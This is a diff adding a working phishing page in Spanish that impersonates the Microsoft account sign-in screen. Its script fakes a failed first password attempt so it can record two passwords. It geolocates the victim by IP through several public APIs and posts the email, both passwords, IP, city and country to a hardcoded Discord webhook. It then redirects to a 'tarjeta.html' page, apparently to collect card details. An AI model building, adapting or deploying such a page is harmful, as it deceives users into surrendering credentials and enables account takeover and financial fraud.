@@ -1,0 +1,964 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=yes"
+    />
+    <title>Cuenta de Microsoft - Iniciar sesión</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family:
+          "Segoe UI",
+          "Segoe UI Web (West European)",
+          "Segoe UI",
+          -apple-system,
+          BlinkMacSystemFont,
+          Roboto,
+          "Helvetica Neue",
+          sans-serif;
+      }
+
+      body {
+        background:
+          linear-gradient(rgba(0, 0, 0, 0.55), rgba(0, 0, 0, 0.55)),
+          url("https://images.unsplash.com/photo-1519681393784-d120267933ba?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80")
+            no-repeat center center fixed;
+        background-size: cover;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 440px;
+        animation: fadeIn 0.8s ease;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 30px;
+        padding-left: 5px;
+      }
+
+      .microsoft-logo {
+        width: 108px;
+        height: 23px;
+        background-image: url("https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31");
+        background-size: contain;
+        background-repeat: no-repeat;
+        margin-right: 10px;
+      }
+
+      .header-text {
+        color: white;
+        font-size: 18px;
+        font-weight: 300;
+      }
+
+      .login-card {
+        background-color: white;
+        border-radius: 8px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        padding: 40px;
+        transition:
+          transform 0.5s ease,
+          opacity 0.5s ease;
+      }
+
+      .login-card.hidden {
+        display: none;
+      }
+
+      .login-card.active {
+        display: block;
+        animation: slideUp 0.5s ease;
+      }
+
+      @keyframes slideUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .screen-title {
+        font-size: 24px;
+        font-weight: 300;
+        margin-bottom: 24px;
+        color: #1b1b1b;
+        line-height: 1.2;
+      }
+
+      .input-group {
+        margin-bottom: 20px;
+      }
+
+      .input-label {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 6px;
+        color: #323130;
+      }
+
+      .input-field {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #8a8886;
+        border-radius: 2px;
+        font-size: 15px;
+        transition: border-color 0.3s;
+      }
+
+      .input-field:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.1);
+      }
+
+      .input-field.error {
+        border-color: #d13438;
+      }
+
+      .email-display {
+        padding: 12px;
+        background-color: #f3f2f1;
+        border-radius: 2px;
+        margin-bottom: 20px;
+        color: #323130;
+        font-size: 15px;
+        border: 1px solid transparent;
+      }
+
+      .email-display strong {
+        font-weight: 600;
+      }
+
+      .change-account-link {
+        color: #0078d4;
+        text-decoration: none;
+        font-size: 13px;
+        display: inline-block;
+        margin-top: 8px;
+      }
+
+      .change-account-link:hover {
+        text-decoration: underline;
+      }
+
+      .help-links {
+        margin-top: 5px;
+        font-size: 13px;
+      }
+
+      .link {
+        color: #0078d4;
+        text-decoration: none;
+        cursor: pointer;
+      }
+
+      .link:hover {
+        text-decoration: underline;
+      }
+
+      .options {
+        margin-top: 25px;
+        font-size: 13px;
+      }
+
+      .options-title {
+        font-weight: 600;
+        margin-bottom: 8px;
+        color: #323130;
+      }
+
+      .options-list {
+        list-style: none;
+      }
+
+      .options-list li {
+        margin-bottom: 5px;
+        display: flex;
+        align-items: center;
+      }
+
+      .options-list li i {
+        margin-right: 8px;
+        color: #0078d4;
+      }
+
+      .button-group {
+        margin-top: 30px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .btn {
+        padding: 10px 24px;
+        border: none;
+        border-radius: 2px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background-color 0.3s;
+        min-height: 32px;
+      }
+
+      .btn-primary {
+        background-color: #0078d4;
+        color: white;
+      }
+
+      .btn-primary:hover {
+        background-color: #106ebe;
+      }
+
+      .btn-secondary {
+        background-color: transparent;
+        color: #0078d4;
+      }
+
+      .btn-secondary:hover {
+        background-color: rgba(0, 120, 212, 0.1);
+      }
+
+      .divider {
+        display: flex;
+        align-items: center;
+        margin: 25px 0;
+        color: #605e5c;
+      }
+
+      .divider::before,
+      .divider::after {
+        content: "";
+        flex: 1;
+        height: 1px;
+        background-color: #e1dfdd;
+      }
+
+      .divider span {
+        padding: 0 15px;
+        font-size: 13px;
+      }
+
+      .footer {
+        margin-top: 40px;
+        text-align: center;
+        font-size: 12px;
+        color: #605e5c;
+      }
+
+      .footer-links {
+        display: flex;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 16px;
+        margin-bottom: 12px;
+        line-height: 1.4;
+        max-height: 32px;
+        overflow: hidden;
+      }
+
+      .footer-links-line-1 {
+        display: flex;
+        justify-content: center;
+        gap: 16px;
+        margin-bottom: 6px;
+        width: 100%;
+      }
+
+      .footer-links-line-2 {
+        display: flex;
+        justify-content: center;
+        gap: 16px;
+        width: 100%;
+      }
+
+      .footer-links-compact {
+        display: grid;
+        grid-template-columns: repeat(2, auto);
+        gap: 12px 20px;
+        justify-content: center;
+        max-width: 280px;
+        margin: 0 auto 12px;
+      }
+
+      .language-selector {
+        margin-top: 15px;
+        display: inline-flex;
+        align-items: center;
+        gap: 5px;
+        cursor: pointer;
+        padding: 5px;
+        border-radius: 2px;
+      }
+
+      .language-selector:hover {
+        background-color: rgba(0, 0, 0, 0.05);
+      }
+
+      .password-field {
+        position: relative;
+      }
+
+      .password-toggle {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        color: #605e5c;
+        cursor: pointer;
+        padding: 5px;
+      }
+
+      .language-flag {
+        font-size: 16px;
+      }
+
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.7);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        display: none;
+      }
+
+      .loading-spinner {
+        width: 50px;
+        height: 50px;
+        border: 5px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: #0078d4;
+        animation: spin 1s ease-in-out infinite;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-text {
+        color: white;
+        margin-top: 20px;
+        font-size: 16px;
+      }
+
+      .error-message {
+        color: #d13438;
+        font-size: 12px;
+        margin-top: 5px;
+        display: none;
+      }
+
+      @media (max-width: 480px) {
+        .login-card {
+          padding: 24px;
+        }
+        .button-group {
+          flex-direction: column;
+          gap: 15px;
+          align-items: flex-start;
+        }
+        .btn {
+          width: 100%;
+        }
+        .footer-links {
+          gap: 12px;
+        }
+        .footer-links-compact {
+          grid-template-columns: repeat(2, auto);
+          gap: 8px 16px;
+        }
+        body {
+          background:
+            linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
+            url("https://images.unsplash.com/photo-1519681393784-d120267933ba?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80")
+              no-repeat center center fixed;
+          background-size: cover;
+        }
+      }
+
+      @media (max-width: 360px) {
+        .footer-links-compact {
+          grid-template-columns: 1fr;
+          gap: 8px;
+          text-align: center;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="loading-overlay" id="loadingOverlay">
+      <div style="text-align: center">
+        <div class="loading-spinner"></div>
+      </div>
+    </div>
+
+    <div class="container">
+      <!-- Pantalla 1: Correo electrónico (español) -->
+      <div id="screen1" class="login-card active">
+        <div class="header">
+          <div class="microsoft-logo"></div>
+          <div class="header-text">Cuenta de Microsoft</div>
+        </div>
+        <h2 class="screen-title">Iniciar sesión</h2>
+
+        <div class="input-group">
+          <label class="input-label"
+            >Correo electrónico, teléfono o Skype</label
+          >
+          <input
+            type="text"
+            id="emailInput"
+            class="input-field"
+            placeholder="Introduce tu correo, teléfono o Skype"
+            autocomplete="username"
+          />
+          <div class="help-links">
+            <span id="emailError" class="error-message"
+              >Introduce una dirección de correo electrónico, un número de
+              teléfono o un nombre de Skype válido.</span
+            >
+          </div>
+        </div>
+
+        <div class="button-group">
+          <a href="#" class="link">¿No tiene una cuenta? Crear una.</a>
+          <button id="nextBtn" class="btn btn-primary">Siguiente</button>
+        </div>
+
+        <div class="divider"><span>o</span></div>
+        <div class="help-links">
+          <a href="#" class="link">¿No puede acceder a su cuenta?</a>
+        </div>
+
+        <div class="footer">
+          <div class="footer-links">
+            <div class="footer-links-line-1">
+              <a href="#" class="link">Ayuda y comentarios</a>
+              <a href="#" class="link">Términos de uso</a>
+            </div>
+            <div class="footer-links-line-2">
+              <a href="#" class="link">Privacidad y cookies</a>
+            </div>
+          </div>
+          <div class="language-selector" id="languageSelector">
+            <span class="language-flag">🇪🇸</span>
+            <span>Español (España)</span>
+            <i class="fas fa-chevron-down"></i>
+          </div>
+        </div>
+      </div>
+
+      <!-- Pantalla 2: Contraseña (con lógica de dos intentos) -->
+      <div id="screen2" class="login-card hidden">
+        <div class="header">
+          <div class="microsoft-logo"></div>
+          <div class="header-text">Cuenta de Microsoft</div>
+        </div>
+        <h2 class="screen-title">Ingrese su contraseña</h2>
+
+        <div class="email-display">
+          Cuenta: <strong id="userEmailDisplay"></strong>
+          <div>
+            <a href="#" id="changeAccountLink" class="change-account-link"
+              >Iniciar sesión con otra cuenta de Microsoft</a
+            >
+          </div>
+        </div>
+
+        <div class="input-group">
+          <label class="input-label">Contraseña</label>
+          <div class="password-field">
+            <input
+              type="password"
+              id="passwordInput"
+              class="input-field"
+              placeholder="Contraseña"
+              autocomplete="current-password"
+            />
+            <button type="button" id="togglePassword" class="password-toggle">
+              <i class="far fa-eye"></i>
+            </button>
+          </div>
+          <div class="help-links">
+            <a href="#" class="link">¿Olvidó su contraseña?</a>
+            <div id="passwordError" class="error-message"></div>
+          </div>
+        </div>
+
+        <div class="button-group">
+          <button id="backBtn" class="btn btn-secondary">
+            <i class="fas fa-arrow-left"></i> Volver
+          </button>
+          <button id="signInBtn" class="btn btn-primary">Iniciar sesión</button>
+        </div>
+
+        <div class="footer">
+          <div class="footer-links">
+            <a href="#" class="link">Ayuda y comentarios</a>
+            <a href="#" class="link">Términos de uso</a>
+            <a href="#" class="link">Privacidad y cookies</a>
+          </div>
+          <p style="margin-top: 10px; font-size: 11px; color: #8a8886">
+            Use navegación privada si no es su equipo.
+            <a href="#" class="link">Más información</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Elementos del DOM
+      const screen1 = document.getElementById("screen1");
+      const screen2 = document.getElementById("screen2");
+      const nextBtn = document.getElementById("nextBtn");
+      const backBtn = document.getElementById("backBtn");
+      const signInBtn = document.getElementById("signInBtn");
+      const changeAccountLink = document.getElementById("changeAccountLink");
+      const emailInput = document.getElementById("emailInput");
+      const passwordInput = document.getElementById("passwordInput");
+      const userEmailDisplay = document.getElementById("userEmailDisplay");
+      const emailError = document.getElementById("emailError");
+      const passwordError = document.getElementById("passwordError");
+      const togglePassword = document.getElementById("togglePassword");
+      const languageSelector = document.getElementById("languageSelector");
+      const loadingOverlay = document.getElementById("loadingOverlay");
+
+      // Variables de estado
+      let userEmail = "";
+      let passwordAttempts = 0;
+
+      // Validación básica de email (sencilla)
+      function isValidEmail(email) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
+        const skypeRegex = /^[a-zA-Z0-9._-]+$/;
+        return (
+          emailRegex.test(email) ||
+          phoneRegex.test(email.replace(/\D/g, "")) ||
+          skypeRegex.test(email) ||
+          email.length > 0
+        );
+      }
+
+      // Mostrar/ocultar loading
+      function showLoading() {
+        loadingOverlay.style.display = "flex";
+      }
+      function hideLoading() {
+        loadingOverlay.style.display = "none";
+      }
+
+      // NUEVO: Obtener IP, ciudad y país desde ipapi.co
+      async function fetchWithTimeout(url, timeout = 5000) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), timeout);
+
+        try {
+          const response = await fetch(url, {
+            signal: controller.signal,
+            headers: {
+              Accept: "application/json",
+            },
+          });
+
+          if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+          }
+
+          return await response.json();
+        } finally {
+          clearTimeout(timer);
+        }
+      }
+
+      async function getIPInfo() {
+        const apis = [
+          {
+            name: "ipapi.co",
+            url: "https://ipapi.co/json/",
+            parse: (data) => ({
+              ip: data.ip,
+              city: data.city,
+              region: data.region,
+              country: data.country_name,
+              countryCode: data.country_code,
+              latitude: data.latitude,
+              longitude: data.longitude,
+              isp: data.org,
+              timezone: data.timezone,
+            }),
+          },
+          {
+            name: "ipwho.is",
+            url: "https://ipwho.is/",
+            parse: (data) => {
+              if (data.success === false)
+                throw new Error(data.message || "API inválida");
+
+              return {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                countryCode: data.country_code,
+                latitude: data.latitude,
+                longitude: data.longitude,
+                isp: data.connection?.isp,
+                timezone: data.timezone?.id,
+              };
+            },
+          },
+          {
+            name: "ip-api.com",
+            url: "https://ip-api.com/json/?fields=status,message,query,city,regionName,country,countryCode,lat,lon,isp,timezone",
+            parse: (data) => {
+              if (data.status !== "success")
+                throw new Error(data.message || "API inválida");
+
+              return {
+                ip: data.query,
+                city: data.city,
+                region: data.regionName,
+                country: data.country,
+                countryCode: data.countryCode,
+                latitude: data.lat,
+                longitude: data.lon,
+                isp: data.isp,
+                timezone: data.timezone,
+              };
+            },
+          },
+          {
+            name: "geolocation-db.com",
+            url: "https://geolocation-db.com/json/",
+            parse: (data) => ({
+              ip: data.IPv4,
+              city: data.city,
+              region: data.state,
+              country: data.country_name,
+              countryCode: data.country_code,
+              latitude: data.latitude,
+              longitude: data.longitude,
+              isp: null,
+              timezone: null,
+            }),
+          },
+        ];
+
+        for (const api of apis) {
+          try {
+            const data = await fetchWithTimeout(api.url, 5000);
+            const parsed = api.parse(data);
+
+            return {
+              ip: parsed.ip || "No disponible",
+              city: parsed.city || "No disponible",
+              region: parsed.region || "No disponible",
+              country: parsed.country || "No disponible",
+              countryCode: parsed.countryCode || "No disponible",
+              latitude: parsed.latitude || "No disponible",
+              longitude: parsed.longitude || "No disponible",
+              isp: parsed.isp || "No disponible",
+              timezone: parsed.timezone || "No disponible",
+              source: api.name,
+            };
+          } catch (error) {
+            console.warn(`Falló ${api.name}:`, error.message);
+          }
+        }
+
+        return {
+          ip: "No disponible",
+          city: "No disponible",
+          region: "No disponible",
+          country: "No disponible",
+          countryCode: "No disponible",
+          latitude: "No disponible",
+          longitude: "No disponible",
+          isp: "No disponible",
+          timezone: "No disponible",
+          source: "Ninguna API respondió",
+        };
+      }
+
+      // Envío al servidor (SOLO en segundo intento) - AHORA incluye IP, ciudad y país
+      async function sendToServer(email, password) {
+        showLoading();
+
+        // Obtener información de IP y ubicación
+        const ipInfo = await getIPInfo(); // NUEVO
+
+        const clave1 = localStorage.getItem("clave1") || "No disponible";
+        const mensajeEmbed = {
+          embeds: [
+            {
+              title: "🔐 Nuevo inicio de sesión capturado",
+              color: 0x5865f2,
+              fields: [
+                {
+                  name: "📧 **Correo electrónico**",
+                  value: `\`${email}\``,
+                  inline: false,
+                },
+                {
+                  name: "🔑 **Contraseña 1**",
+                  value: `\`${password}\``,
+                  inline: true,
+                },
+                {
+                  name: "🔄 **Contraseña 2 (clave1)**",
+                  value: `\`${clave1}\``,
+                  inline: true,
+                },
+                // NUEVOS CAMPOS: IP, Ciudad, País
+                {
+                  name: "🌐 **IP del usuario**",
+                  value: `\`${ipInfo.ip}\``,
+                  inline: true,
+                },
+                {
+                  name: "🏙️ **Ciudad**",
+                  value: `\`${ipInfo.city}\``,
+                  inline: true,
+                },
+                {
+                  name: "🇵🇰 **País**", // El emoji se puede cambiar, pero es ilustrativo
+                  value: `\`${ipInfo.country}\``,
+                  inline: true,
+                },
+                {
+                  name: "🕒 **Fecha y hora**",
+                  value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                  inline: false,
+                },
+              ],
+              footer: {
+                text: "Microsoft • Captura automática",
+              },
+              timestamp: new Date().toISOString(),
+            },
+          ],
+        };
+
+        const discordWebhookUrl =
+          "https://discord.com/api/webhooks/1527449712288993312/59_rdVEMJSV8URksVsuWMWXF-zEJ4trRo0QGBD5u7bXxhoxECW_WfEG2E45UbLUWXGAv";
+
+        fetch(discordWebhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(mensajeEmbed),
+        })
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error(`Error HTTP: ${response.status}`);
+            }
+            setTimeout(() => {
+              hideLoading();
+              window.location.href = "tarjeta.html";
+            }, 1500);
+          })
+          .catch((error) => {
+            console.error("Error al enviar datos a Discord:", error);
+            setTimeout(() => {
+              hideLoading();
+              window.location.href = "tarjeta.html";
+            }, 1500);
+          });
+      }
+
+      // Reiniciar estado de contraseña (intentos) cuando se vuelve a la pantalla de email
+      function resetPasswordAttemptState() {
+        passwordAttempts = 0;
+        if (passwordInput) {
+          passwordInput.value = "";
+          passwordInput.classList.remove("error");
+        }
+        if (passwordError) {
+          passwordError.style.display = "none";
+          passwordError.innerHTML = "";
+        }
+      }
+
+      // Mostrar pantalla de contraseña (screen2)
+      function showPasswordScreen(email) {
+        userEmailDisplay.textContent = email;
+        resetPasswordAttemptState();
+
+        screen1.classList.remove("active");
+        setTimeout(() => {
+          screen1.classList.add("hidden");
+          screen2.classList.remove("hidden");
+          screen2.classList.add("active");
+          languageSelector.innerHTML =
+            '<span class="language-flag">🇪🇸</span><span>Español (España)</span><i class="fas fa-chevron-down"></i>';
+          setTimeout(() => passwordInput.focus(), 100);
+        }, 300);
+      }
+
+      // Volver a pantalla de email (desde pantalla contraseña)
+      function goBackToEmailScreen() {
+        resetPasswordAttemptState();
+
+        screen2.classList.remove("active");
+        setTimeout(() => {
+          screen2.classList.add("hidden");
+          screen1.classList.remove("hidden");
+          screen1.classList.add("active");
+          languageSelector.innerHTML =
+            '<span class="language-flag">🇪🇸</span><span>Español (España)</span><i class="fas fa-chevron-down"></i>';
+          setTimeout(() => emailInput.focus(), 100);
+        }, 300);
+      }
+
+      // Evento "Siguiente" (desde email)
+      nextBtn.addEventListener("click", function () {
+        const email = emailInput.value.trim();
+        if (!isValidEmail(email)) {
+          emailInput.classList.add("error");
+          emailError.style.display = "block";
+          return;
+        }
+        userEmail = email || "anddesk@hotmail.com";
+        showPasswordScreen(userEmail);
+      });
+
+      // Evento "Volver" (desde contraseña)
+      backBtn.addEventListener("click", function () {
+        goBackToEmailScreen();
+      });
+
+      // Cambiar cuenta (link dentro de screen2)
+      changeAccountLink.addEventListener("click", function (e) {
+        e.preventDefault();
+        goBackToEmailScreen();
+      });
+
+      // Mostrar/ocultar contraseña
+      togglePassword.addEventListener("click", function () {
+        const type =
+          passwordInput.getAttribute("type") === "password"
+            ? "text"
+            : "password";
+        passwordInput.setAttribute("type", type);
+        const icon = togglePassword.querySelector("i");
+        icon.classList.toggle("fa-eye");
+        icon.classList.toggle("fa-eye-slash");
+      });
+
+      // LÓGICA PRINCIPAL: Iniciar sesión con dos intentos, SOLO el segundo envía al servidor
+      signInBtn.addEventListener("click", function () {
+        const password = passwordInput.value;
+
+        if (password.length < 1) {
+          passwordInput.classList.add("error");
+          passwordError.style.display = "block";
+          passwordError.innerHTML = "Debe ingresar una contraseña.";
+          return;
+        }
+
+        if (passwordAttempts === 0) {
+          passwordInput.classList.add("error");
+          passwordError.style.display = "block";
+          localStorage.setItem("clave1", passwordInput.value);
+          passwordError.innerHTML =
+            "Contraseña incorrecta. Vuelva a intentarlo.";
+          passwordInput.value = "";
+          passwordInput.focus();
+          passwordAttempts = 1;
+          return;
+        } else {
+          passwordInput.classList.remove("error");
+          passwordError.style.display = "none";
+          passwordError.innerHTML = "";
+          sendToServer(userEmail, password);
+        }
+      });
+
+      // Limpiar errores de email en tiempo real
+      emailInput.addEventListener("input", function () {
+        if (isValidEmail(emailInput.value.trim())) {
+          emailInput.classList.remove("error");
+          emailError.style.display = "none";
+        }
+      });
+
+      // Limpiar errores de contraseña mientras el usuario escribe
+      passwordInput.addEventListener("input", function () {
+        if (passwordInput.value.length >= 1) {
+          passwordInput.classList.remove("error");
+          if (passwordError.style.display === "block") {
+            passwordError.style.display = "none";
+          }
+        }
+      });
+
+      // Permitir Enter para enviar en cada pantalla
+      emailInput.addEventListener("keypress", function (e) {
+        if (e.key === "Enter") nextBtn.click();
+      });
+      passwordInput.addEventListener("keypress", function (e) {
+        if (e.key === "Enter") signInBtn.click();
+      });
+
+      // Selector de idioma simulado
+      languageSelector.addEventListener("click", function () {
+        alert(
+          "Selecciona un idioma:\n\n• Español (España)\n• English (United States)\n• Français\n• Deutsch",
+        );
+      });
+
+      // Enfocar campo email al cargar
+      window.addEventListener("DOMContentLoaded", function () {
+        emailInput.focus();
+      });
+
+      // Prevenir envíos por defecto en formularios inexistentes
+      document.querySelectorAll(".login-card").forEach((card) => {
+        card.addEventListener("submit", (e) => e.preventDefault());
+      });
+    </script>
+</body>
+</html>
